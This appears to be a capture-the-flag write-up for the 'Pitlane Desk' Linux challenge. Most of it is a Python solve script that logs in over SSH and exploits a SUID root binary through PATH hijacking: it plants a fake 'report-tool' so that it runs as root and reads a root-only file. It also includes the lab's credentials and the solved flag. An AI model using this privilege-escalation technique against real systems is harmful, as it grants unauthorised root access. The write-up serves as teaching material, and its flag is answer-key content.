---
title: "Pitlane Desk"
ctf: "Safaricom CTF"
date: 2026-10-04
category: misc
difficulty: medium
points: 300
flag_format: "safctf{...}"
author: "Strawhats"
---

# Pitlane Desk

## Summary

- Desk app: http://54.72.82.22:8540/ (theme RACING)

## Solution

### Step 1: Run the solve script:

```python
#!/usr/bin/env python3
"""Pitlane Desk (misc/linux) — SUID PATH-hijack privesc.

root runs `python /app/service.py`, but the intended path is local privesc:
install.sh installs /usr/local/bin/stage-report (chmod 4755, SUID root).
report.c: setgid(0); setuid(0); execvp("report-tool", ...) — execvp searches
the caller's PATH, so a fake `report-tool` earlier in PATH executes as root.
Flag lives in /root/receipt (0400 root) written by /app/linux/start.sh from $FLAG.
"""
import paramiko, sys

HOST, PORT, USER, PW = "54.72.82.22", 8700, "player", "matinee-visitor"

def run(c, cmd):
    _, out, err = c.exec_command(cmd)
    o = out.read().decode(errors="replace"); e = err.read().decode(errors="replace")
    return o + (("\n[stderr] " + e) if e.strip() else "")

def main():
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(HOST, port=PORT, username=USER, password=PW, timeout=20)
    run(c, "mkdir -p ~/bin")
    run(c, "printf '#!/bin/sh\\nid\\ncat /root/receipt\\n' > ~/bin/report-tool && chmod +x ~/bin/report-tool")
    out = run(c, 'PATH=~/bin:$PATH /usr/local/bin/stage-report')
    c.close()
    print(out)
    for tok in out.replace("\n", " ").split():
        if tok.startswith("safctf{") and tok.endswith("}"):
            print("FLAG:", tok)

if __name__ == "__main__":
    main()

```

## Flag

```
safctf{9cca688790c893101757448298adfb67}
```
